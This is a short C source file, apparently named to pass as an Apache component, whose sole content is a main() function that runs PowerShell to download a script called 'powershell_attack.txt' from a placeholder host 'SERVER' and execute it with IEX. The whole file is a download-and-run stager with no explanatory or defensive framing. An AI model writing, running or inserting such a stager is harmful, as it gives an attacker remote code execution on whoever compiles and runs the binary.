/* Apache2.c */
#include<stdio.h>
main()
{
system("powershell.exe \"IEX ((new-object net.webclient).downloadstring('http://SERVER/powershell_attack.txt '))\"");
return 0;
}
